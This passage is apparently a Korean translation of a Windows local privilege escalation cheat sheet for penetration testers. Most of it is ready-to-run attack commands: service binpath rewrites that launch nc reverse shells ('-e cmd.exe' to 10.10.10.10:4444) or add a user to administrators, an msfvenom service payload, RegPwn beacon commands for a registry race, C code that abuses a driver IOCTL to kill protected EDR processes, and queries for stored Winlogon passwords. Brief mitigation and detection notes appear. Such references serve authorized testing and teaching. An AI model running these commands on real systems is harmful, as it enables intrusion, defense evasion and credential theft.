[여기에서 XP용 accesschk.exe를 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

(예를 들어 SSDPSRV에서) 다음 오류가 발생하는 경우:

_시스템 오류 1058이(가) 발생했습니다._\
_서비스가 비활성화되어 있거나 연결된 활성화된 장치가 없기 때문에 서비스를 시작할 수 없습니다._

다음을 사용하여 활성화할 수 있습니다.
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost service가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요(XP SP1의 경우)**

**이 문제의 또 다른 우회 방법**은 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

"Authenticated users" 그룹이 서비스에 대해 **SERVICE_ALL_ACCESS** 권한을 보유한 시나리오에서는 서비스의 실행 파일 바이너리를 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한은 다양한 permission을 통해 상승시킬 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: service binary를 재구성할 수 있습니다.
- **WRITE_DAC**: permission 재구성을 가능하게 하며, service configuration을 변경할 수 있습니다.
- **WRITE_OWNER**: ownership 획득 및 permission 재구성을 허용합니다.
- **GENERIC_WRITE**: service configuration을 변경할 수 있는 권한을 상속합니다.
- **GENERIC_ALL**: service configuration을 변경할 수 있는 권한도 상속합니다.

이 vulnerability의 detection 및 exploitation에는 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### Services binaries weak permissions

service가 **`LocalSystem`**, **`LocalService`**, **`NetworkService`** 또는 privileged domain account로 실행되지만, **low-privileged users가 service EXE 또는 해당 parent folder를 수정할 수 있는 경우**, **binary를 교체하고 service를 재시작하여** service를 hijack할 수 있는 경우가 많습니다.

**service가 실행하는 binary를 수정할 수 있는지** 또는 binary가 위치한 **folder에 write permissions가 있는지 확인하세요** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic**(system32에는 없음)을 사용하여 service가 실행하는 모든 binary를 가져오고 **icacls**를 사용하여 permissions를 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
다음과 같이 **sc** 및 **icacls**도 사용할 수 있습니다:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`**, 또는 **`Authenticated Users`**에 부여된 위험한 ACL을 확인하세요. 특히 서비스 실행 파일 또는 해당 파일이 포함된 디렉터리에 **`(F)`**, **`(M)`**, **`(W)`**가 있는지 확인합니다. 실용적인 악용 흐름은 다음과 같습니다.<sup>[[27]](#references)</sup>

1. `sc qc <service_name>`을 사용하여 서비스 계정과 실행 파일 경로를 확인합니다.
2. `icacls <path>`를 사용하여 바이너리에 쓰기 권한이 있는지 확인합니다.
3. 서비스 바이너리를 payload 또는 유효한 악성 서비스 바이너리로 교체합니다.
4. `sc stop <service_name> && sc start <service_name>`으로 서비스를 다시 시작합니다(또는 재부팅 / 서비스 트리거를 기다립니다).

유용한 automated checks:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> 서비스가 일반 사용자의 재시작을 허용하지 않는 경우, 부팅 시 자동으로 시작되는지, 다시 실행하는 failure action이 있는지 또는 이를 사용하는 애플리케이션에 의해 간접적으로 트리거될 수 있는지 확인하세요.

### Services registry modify permissions

서비스 registry를 수정할 수 있는지 확인해야 합니다.\
다음과 같이 서비스 **registry**에 대한 **permissions**을 **check**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**에 `FullControl` 권한이 있는지 확인해야 합니다. 권한이 있다면 service에서 실행하는 binary를 변경할 수 있습니다.

실행되는 binary의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 임의의 HKLM 값 쓰기를 위한 Registry symlink race (ATConfig)

일부 Windows 접근성 기능은 사용자별 **ATConfig** 키를 생성하며, 이후 **SYSTEM** process가 해당 키를 HKLM session key로 복사합니다. Registry **symbolic link race**를 이용하면 이 권한 있는 쓰기를 **임의의 HKLM 경로**로 redirect하여 임의의 HKLM **값 쓰기** primitive를 얻을 수 있습니다.<sup>[[18]](#references)</sup>

주요 위치 (예: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`에는 설치된 접근성 기능이 나열됩니다.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`에는 사용자가 제어하는 configuration이 저장됩니다.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`는 logon/secure-desktop transitions 중 생성되며 사용자가 쓸 수 있습니다.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM이 쓰도록 할 **HKCU ATConfig** 값을 설정합니다.
2. secure-desktop copy를 trigger합니다 (예: **LockWorkstation**). 그러면 AT broker flow가 시작됩니다.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`에 **oplock**을 설정하여 **race에서 승리**합니다. oplock이 발생하면 **HKLM Session ATConfig** 키를 protected HKLM target으로 연결되는 **registry link**로 교체합니다.
4. SYSTEM이 attacker가 선택한 값을 redirect된 HKLM 경로에 씁니다.

임의의 HKLM 값 쓰기를 얻은 후에는 service configuration 값을 overwrite하여 LPE로 전환할 수 있습니다.

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

일반 사용자가 시작할 수 있는 service(예: **`msiserver`**)를 선택한 다음, 쓰기 이후 해당 service를 trigger합니다. **참고:** public exploit implementation은 race의 일부로 **workstation을 lock**합니다.

Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory 권한

레지스트리에 이 권한이 있다는 것은 **이 레지스트리에서 하위 레지스트리를 생성할 수 있다는 의미입니다**. Windows services의 경우 이는 **임의의 코드를 실행하기에 충분합니다:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로가 따옴표로 묶여 있지 않으면 Windows는 공백 앞에서 끝나는 각 경로를 실행하려고 시도합니다.

예를 들어 경로가 _C:\Program Files\Some Folder\Service.exe_인 경우 Windows는 다음을 실행하려고 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
기본 제공 Windows 서비스에 속하는 경로를 제외하고, 인용되지 않은 모든 서비스 경로를 나열합니다:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**metasploit으로 이 취약점을 탐지하고 exploit할 수 있습니다**: `exploit/windows/local/trusted\_service\_path` metasploit으로 service binary를 수동으로 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 작업

Windows에서는 service가 실패할 경우 수행할 작업을 사용자가 지정할 수 있습니다. 이 기능은 binary를 가리키도록 구성할 수 있습니다. 해당 binary를 교체할 수 있다면 privilege escalation이 가능할 수 있습니다. 자세한 내용은 [공식 문서](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있습니다.

## Applications

### 설치된 Applications

**binary의 권한**을 확인하고 (하나를 덮어써서 privileges를 escalate할 수 있을 수 있음), 폴더의 권한도 확인하세요 ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

일부 config file을 수정하여 특수한 file을 읽을 수 있는지, 또는 Administrator account로 실행될 binary(schedtasks)를 수정할 수 있는지 확인합니다.

시스템에서 권한이 취약한 folder/file을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++는 `plugins` 하위 폴더에 있는 모든 plugin DLL을 자동으로 로드합니다. 쓰기 가능한 portable/copy install이 존재한다면, 악성 plugin을 배치하여 실행할 때마다 `notepad++.exe` 내부에서 자동 code execution을 수행할 수 있습니다(`DllMain` 및 plugin callbacks 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 시작 시 실행

**다른 user가 실행할 binary 또는 registry 일부를 overwrite할 수 있는지 확인합니다.**\
**다음 페이지를** 읽고 **privilege를 escalate하기 위한 흥미로운 autoruns 위치**에 대해 자세히 알아보세요:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **third party의 이상하거나 취약한** 드라이버를 찾습니다
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (일반적으로 poorly designed IOCTL handlers에서 발생), kernel memory에서 SYSTEM token을 직접 훔쳐 privilege escalation을 수행할 수 있습니다.<sup>[[13]](#references)</sup> 단계별 technique은 여기에서 확인할 수 있습니다:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

vulnerable call이 attacker-controlled Object Manager path를 여는 race-condition bug의 경우, lookup을 의도적으로 지연시키면 (max-length components 또는 deep directory chains 사용) window를 microseconds에서 수십 microseconds까지 늘릴 수 있습니다:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, and I/O ring pivots

일부 Windows kernel LPE chain은 개별적으로는 취약한 두 가지 bug로 구성할 수 있습니다. 하나는 queue lock이 계속 유지되는 동안 request/CBD를 free하는 **cancel-safe queue lifetime race**이고, 다른 하나는 `RtlCopyToUser` 중 free된 paged-pool allocation을 leak하는 **lock-release-before-copy** disclosure입니다.<sup>[[29]](#references)</sup>

Audit 및 exploitation 참고 사항:

- **Free-under-lock + cancel afterwards**: success path가 **Acquire -> CompleteRequest/free -> Release**를 수행하고, cancel path가 **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**를 수행하는 경우를 찾습니다. success path가 CBDQ/CSQ lock을 release하기 전에 `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`에 도달하면, `NtCancelIoFileEx -> IopCsqCancelRoutine`에서 block된 thread가 나중에 재개되어 free된 `PFLT_CALLBACK_DATA`를 driver의 remove callback에 전달할 수 있습니다.
- free된 queue object를 동일한 크기의 attacker-controlled paged-pool allocation으로 **reclaim**합니다. `NPFS` Data Queue Entries는 payload와 size를 제어할 수 있고, 이후 pipe read/peek operations으로 probe할 수 있으므로 유용합니다. free된 object가 list links를 포함한다면, 이를 **user memory에 있는 fake request nodes의 cyclic list**로 덮어써 driver가 원래 list head에서 종료되는 대신 attacker가 정의한 request structures를 반복적으로 처리하도록 합니다.
- 예측 가능한 write를 **upgrade**합니다. fake request가 bookkeeping writes (timestamps / QPC / refcount-adjacent fields)에 사용되는 nested context pointer를 redirect한다면, **address-controlled but not value-controlled** kernel write를 얻을 수 있습니다. 이 경우 최종 code/data pointer 대신 sprayed pool object의 **length/size** field를 target으로 지정한 다음, corrupted object가 **out-of-bounds paged-pool read**를 제공할 때까지 spray를 enumerate합니다.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`를 수행하는 모든 syscall은 유력한 candidate입니다. attacker가 copied buffer의 크기를 늘릴 수 있으면 reliability가 향상됩니다. 예를 들어 serializer의 최종 allocation size를 증가시키는 많은 list/resource entries를 추가하면, machine을 반드시 crash시키지 않으면서 더 긴 copy로 replacement window를 넓힐 수 있습니다.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays는 paged-pool size가 attacker-controlled (`8 * regBufferCnt`)이고 각 element가 `_IOP_MC_BUFFER_ENTRY`에 대한 kernel pointer이므로 훌륭한 disclosure target입니다. 이러한 array 중 하나를 leak하고 주변의 `IORING_OBJECT`를 복구한 다음, **`RegBuffers`**와 **`RegBuffersCount`**를 corrupt하여 이후 I/O ring operations가 attacker-forged entries를 사용하고 arbitrary kernel read/write를 제공하도록 합니다. 사용 가능한 유일한 write가 stable byte (예: `KUSER_SHARED_DATA+0x14`)만 제공하는 경우, **overlapping unaligned writes**를 사용해 `0x0101010101010101`과 같은 repeated-byte user pointer를 만들고, 이를 `VirtualAlloc`으로 map한 뒤 forged registered-buffer array를 그곳에 배치합니다.<sup>[[30]](#references)</sup>

유용한 debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
손상된 I/O ring에서 임의의 kernel read/write를 획득한 후, 표준 post-primitive workflow를 사용해 SYSTEM token을 탈취합니다:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

최신 hive 취약점에서는 결정론적 레이아웃을 groom하고, 쓰기 가능한 HKLM/HKU 하위 키를 악용하며, custom driver 없이 metadata corruption을 kernel paged-pool overflow로 변환할 수 있습니다. 전체 chain은 여기에서 확인할 수 있습니다:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled paths를 통한 `RtlQueryRegistryValues` direct-mode type confusion

일부 driver는 userland에서 registry path를 받아 올바른 UTF-16 문자열인지 여부만 검증한 다음, `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`를 stack scalar인 `int readValue` 등에 대해 `RTL_QUERY_REGISTRY_DIRECT`와 함께 호출합니다. `RTL_QUERY_REGISTRY_TYPECHECK`가 없으면 `EntryContext`는 개발자가 예상한 type이 아니라 **실제** registry type에 따라 해석됩니다.

이로 인해 두 가지 유용한 primitive가 생성됩니다:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path를 통해 driver가 attacker가 선택한 key를 query하도록 만들고, return code/log를 통해 존재 여부를 leak하며, 경우에 따라 caller가 직접 access할 수 없는 value를 읽을 수 있습니다.
- **Kernel memory corruption**: `&readValue`와 같은 scalar destination은 registry value type에 따라 `REG_QWORD`, `UNICODE_STRING` 또는 크기가 지정된 binary buffer로 type-confusion됩니다.

실제 exploitation 참고 사항:

- **Windows 8+ mitigation**: query가 `RTL_QUERY_REGISTRY_DIRECT`를 사용하지만 `RTL_QUERY_REGISTRY_TYPECHECK` 없이 **untrusted hive**에 접근하면, kernel caller는 `KERNEL_SECURITY_CHECK_FAILURE (0x139)`와 함께 crash합니다. exploitability를 유지하려면 `HKCU` 아래에 value를 staging하는 대신 **trusted system hive 내부의 attacker-writable key**를 찾으십시오.
- **Trusted-hive staging**: NtObjectManager를 사용해 `\Registry\Machine`의 writable descendant를 열거하고, duplicated **low-integrity** token으로 scan을 다시 실행하여 sandboxed context에서 접근 가능한 key를 찾으십시오:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4바이트 `int`에 8바이트를 직접 쓰면 인접한 스택 데이터가 손상되고, 근처의 callback/function pointer가 부분적으로 덮어써질 수 있습니다.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode에서는 `EntryContext`가 `UNICODE_STRING`을 가리킬 것으로 예상합니다. 코드가 먼저 공격자가 제어하는 `REG_DWORD`를 스택 scalar에 로드한 후 동일한 버퍼를 문자열 읽기에 재사용하면, 공격자가 `Length`/`MaximumLength`를 제어하고 `Buffer` pointer에도 부분적으로 영향을 주어 반제어된 kernel write가 발생합니다.
- **`REG_BINARY`**: 큰 binary data의 경우 direct mode는 `EntryContext`의 첫 번째 `LONG`을 signed buffer size로 취급합니다. 이전 `REG_DWORD` read가 재사용된 scalar에 **음수인 공격자 제어 값**을 남기면, 다음 `REG_BINARY` query가 인접한 스택 슬롯을 공격자 바이트로 직접 덮어씁니다. 이는 callback-pointer를 완전히 덮어쓰는 가장 깔끔한 경로인 경우가 많습니다.

강력한 hunting pattern: **초기화하지 않은 동일한 stack variable에 서로 다른 유형의 registry read를 수행하는 것**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, 재사용되는 `EntryContext` pointers, 그리고 첫 번째 registry read가 두 번째 read의 실행 여부를 제어하는 code path를 grep하세요.

#### Device object에서 누락된 FILE_DEVICE_SECURE_OPEN 악용 (LPE + EDR kill)

일부 서명된 third-party driver는 IoCreateDeviceSecure를 사용해 강력한 SDDL로 device object를 생성하지만, DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하지 않습니다. 이 flag가 없으면 extra component가 포함된 path를 통해 device를 열 때 secure DACL이 적용되지 않으므로, 권한이 없는 사용자가 다음과 같은 namespace path를 사용해 handle을 얻을 수 있습니다:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (실제 사례)

사용자가 device를 열 수 있게 되면, driver가 노출한 privileged IOCTL을 LPE 및 tampering에 악용할 수 있습니다. 실제 환경에서 관찰된 capability의 예:
- 임의의 process에 대한 full-access handle 반환 (token theft / DuplicateTokenEx/CreateProcessAsUser를 통한 SYSTEM shell).
- 제한 없는 raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL)을 포함한 임의의 process 종료. 이를 통해 user land에서 kernel을 이용해 AV/EDR kill 가능.

최소 PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 Mitigations
- DACL로 제한할 장치 객체를 생성할 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한 있는 작업에 대해 호출자 컨텍스트를 검증하세요. 프로세스 종료 또는 핸들 반환을 허용하기 전에 PP/PPL 확인을 추가하세요.
- IOCTL(access masks, METHOD_*, input validation)을 제한하고, 직접적인 커널 권한을 사용하는 대신 brokered model을 고려하세요.

Defenders를 위한 Detection 아이디어
- 의심스러운 장치 이름(예: \\ .\\amsdk*)에 대한 user-mode open과 abuse를 나타내는 특정 IOCTL sequence를 모니터링하세요.
- Microsoft의 vulnerable driver blocklist(HVCI/WDAC/Smart App Control)를 적용하고 자체 allow/deny list를 유지하세요.


## PATH DLL Hijacking

**PATH에 포함된 폴더 내부에 write permissions**이 있으면, 프로세스가 로드하는 DLL을 hijack하여 **privileges를 escalate**할 수 있습니다.<sup>[[2]](#references)</sup>

PATH 내부의 모든 폴더에 대한 permissions를 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules`를 통한 Node.js / Electron module resolution hijacking

이는 **Node.js** 및 **Electron** 애플리케이션이 예상된 module이 **missing** 상태일 때 `require("foo")`와 같은 bare import를 수행하는 경우에 영향을 주는 **Windows uncontrolled search path** 변형입니다.<sup>[[20]](#references)</sup>

Node는 directory tree를 따라 상위 directory의 각 `node_modules` folder를 확인하며 package를 resolve합니다. Windows에서는 이 탐색이 drive root까지 도달할 수 있으므로, `C:\Users\Administrator\project\app.js`에서 시작된 애플리케이션은 다음 경로를 확인할 수 있습니다.<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user**가 `C:\node_modules`를 생성할 수 있다면, 악성 `foo.js`(또는 package folder)를 심어 두고 **higher-privileged Node/Electron process**가 missing dependency를 resolve할 때까지 기다릴 수 있습니다. payload는 victim process의 security context에서 실행되므로, target이 administrator 권한으로 실행되거나 elevated scheduled task/service wrapper에서 실행되거나 auto-start된 privileged desktop app인 경우 이는 **LPE**가 됩니다.

이는 특히 다음과 같은 경우에 흔합니다.

- dependency가 `optionalDependencies`에 선언된 경우<sup>[[22]](#references)</sup>
- third-party library가 `require("foo")`를 `try/catch`로 감싸고 실패 시 계속 진행하는 경우
- production build에서 package가 제거되었거나, packaging 중 누락되었거나, install에 실패한 경우
- 취약한 `require()`가 main application code가 아니라 dependency tree 깊숙한 곳에 있는 경우

### 취약한 target 탐색

**Procmon**을 사용하여 resolution path를 입증합니다.<sup>[[23]](#references)</sup>

- `Process Name` = target executable(`node.exe`, Electron app EXE 또는 wrapper process)로 filter
- `Path`에 `node_modules`가 `contains`되도록 filter
- `NAME NOT FOUND` 및 `C:\node_modules` 아래에서 최종적으로 성공한 open에 집중

unpacked `.asar` files 또는 application sources에서 유용한 code-review pattern은 다음과 같습니다.
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon 또는 소스 검토를 통해 **누락된 패키지 이름**을 식별합니다.
2. 아직 존재하지 않는 경우 루트 lookup 디렉터리를 생성합니다:
```powershell
mkdir C:\node_modules
```
3. 예상되는 정확한 이름의 module을 drop합니다:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 피해자 애플리케이션을 트리거합니다. 애플리케이션이 `require("foo")`를 시도하고 정상적인 모듈이 없다면, Node는 `C:\node_modules\foo.js`를 로드할 수 있습니다.

이 패턴에 해당하는 누락된 optional 모듈의 실제 예로는 `bluebird`와 `utf-8-validate`가 있지만, 재사용 가능한 부분은 **technique**입니다. 즉, 권한이 높은 Windows Node/Electron 프로세스가 resolve할 **누락된 bare import**를 찾습니다.

### Detection 및 hardening 아이디어

- 사용자가 `C:\node_modules`를 생성하거나 그곳에 새 `.js` 파일/패키지를 작성할 때 alert를 발생시킵니다.
- high-integrity 프로세스가 `C:\node_modules\*`에서 파일을 읽는지 hunt합니다.
- production 환경에 모든 runtime dependencies를 패키징하고 `optionalDependencies` 사용을 audit합니다.
- 서드파티 코드에서 조용히 실행되는 `try { require("...") } catch {}` 패턴을 검토합니다.
- 라이브러리가 지원하는 경우 optional probe를 비활성화합니다. 예를 들어 일부 `ws` 배포에서는 `WS_NO_UTF_8_VALIDATE=1`을 사용해 legacy `utf-8-validate` probe를 피할 수 있습니다.

## 네트워크

### 공유####
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts 파일

hosts 파일에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인합니다.
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 열린 포트

외부에서 **제한된 서비스**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령어는 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 조회, 규칙 생성, 비활성화, 비활성화...)**

[네트워크 열거를 위한 추가 명령어는 여기에서 확인하세요](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root 사용자를 획득하면 모든 포트에서 수신 대기할 수 있습니다 (`nc.exe`를 사용해 포트에서 처음으로 수신 대기할 때 방화벽에서 `nc`를 허용할지 GUI를 통해 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash를 root로 쉽게 시작하려면 `--default-user root`를 사용할 수 있습니다.

`WSL` 파일 시스템은 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다.

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
